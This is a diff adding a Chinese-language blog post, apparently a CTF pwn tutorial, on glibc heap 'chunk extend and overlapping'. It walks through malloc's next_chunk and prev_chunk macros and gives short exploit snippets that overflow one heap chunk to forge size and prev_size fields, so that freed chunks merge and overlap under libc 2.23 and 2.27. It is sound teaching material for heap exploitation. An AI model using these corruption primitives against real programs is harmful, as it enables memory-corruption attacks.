@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          chunk extend and overlapping - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>chunk extend的利用手法是基于plmalloc对于堆块的各种宏定义 其是通过计算chunk首地址和size大小来推断出上一个chunk或者是下一个chunk的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>
+
+<p>获取下一个chunk的地址既是通过当前chunk地址加上当前chunk大小</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>
+
+<p>获取上一个chunk的地址则是通过当前chunk的地址减去前一个chunk的大小</p>
+<p>也就是说 只要我们修改了chunk的size域和prev_size域 就可以使plmalloc误判chunk</p>
+<h2 id="堆溢出覆盖下一个chunk的size域"><a href="#堆溢出覆盖下一个chunk的size域" class="headerlink" title="堆溢出覆盖下一个chunk的size域"></a>堆溢出覆盖下一个chunk的size域</h2><p>这个手法主要有两种适用的题型 一种是有伴随堆块的情况下 并且没有堆溢出 通过这种手法可以修改伴随堆块的内容</p>
+<p>第二种是libc2.27的情况下 tcachebin的存在会使得我们打unsortedbin造成很大的影响 要么就是填满链表要么就是申请一个超过tcachebin大小的chunk并释放 有的题目会对这两种解决办法进行限制 这个时候就可以利用这种办法来合并chunk 从而获得一个超过tcachebin范围的堆块</p>
+<p>下面来分别演示一下</p>
+<h3 id="环境-ubuntu22-二进制文件依赖的libc2-27-目测2-23以上的版本都可以"><a href="#环境-ubuntu22-二进制文件依赖的libc2-27-目测2-23以上的版本都可以" class="headerlink" title="环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以"></a>环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+
+<p>首先申请三个堆块 chunk1用来堆溢出 覆盖chunk2的size域 chunk3用来和chunk2合并</p>
+<p>唯一要注意的是覆盖size域的值 需要包括两个堆块的prev_size域和size域</p>
+<p><img src="https://pic.imgdb.cn/item/63ff0c72f144a01007ba0762.png"></p>
+<p>所以此时用来覆盖chunk2的size域的数值应为0x51</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+<span class="string">b&#x27;\x51&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+
+<p>此时chunk2就和chunk3合并了</p>
+<p><img src="https://pic.imgdb.cn/item/63ff0d0ff144a01007bb11d4.png"></p>
+<p>此时chunk2的指针指向的仍然是chunk2的首地址 但是plmalloc已经误判了chunk2  原本其是一个0x31大小的chunk 此时plmalloc误判其还包含了chunk3 所以释放chunk2就会一并释放chunk3</p>
+<p><img src="https://pic.imgdb.cn/item/63ff0d8ff144a01007bc32dd.png"></p>
+<p>可以看到一并放入了tcache 这里之所以没有和top chunk合并 是因为tcache中的chunk  Inuse位仍然为1</p>
+<p>此时我们申请一个0x40大小的chunk 就可以获得原本chunk3的空间 从而对chunk3的内容进行任意修改</p>
+<p>此外还有一种情况 如果chunk2先被释放进入tcachebin后再更改size域会发生什么呢</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x441</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+
+<p>此时注意 chunk2不能位于fastbin或者是tcachebin中  如果位于二者中 下一个chunk的Inuse位就不会为0 这样就不会合并</p>
+<p>gdb动调看一下是否合并成功</p>
+<p><img src="https://pic.imgdb.cn/item/63ff1440f144a01007c707e8.png"></p>
+<h3 id="环境-ubuntu16-二进制依赖libc2-23"><a href="#环境-ubuntu16-二进制依赖libc2-23" class="headerlink" title="环境: ubuntu16 二进制依赖libc2.23"></a>环境: ubuntu16 二进制依赖libc2.23</h3><p>这类的利用手法被称为overpadding</p>
+<p>你可以理解为反方向的合并 刚才是由chunk2吞并chunk3 修改的是chunk2的size域 现在我们来修改chunk3的prev_size域和size域 从而使得chunk2合并chunk3</p>
+<p>这里的知识点其实和unlink有点相似 unlink也是通过构造fake chunk 伪造好next chunk的prev_size和size</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#3</span></span><br></pre></td></tr></table></figure>
+
+<p>首先申请四个chunk 前三个用来负责合并  第四个用来保证不和top chunk合并</p>
+<p>我们以chunk1来为堆溢出的起点 覆盖chunk2的prev_size和size域 不过在此之前还需要先释放chunk0到unsortedbin中(只要不是fastbin和tcachebin就可以) 这样才能使得后面的合并生效</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(<span class="number">0xb0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>注意一下chunk2的size域  Inuse位一定要为0 否则不会合并</p>
+<p>此时我们释放chunk2 来看看是否合并成功</p>
+<p><img src="https://pic.imgdb.cn/item/63ff1bccf144a01007d27839.png"></p>
+<p>这种一般是伴随堆块先申请的情况可以利用  从而获取到低地址处堆块任意写的机会</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2023-03-01</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/heap/">heap</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
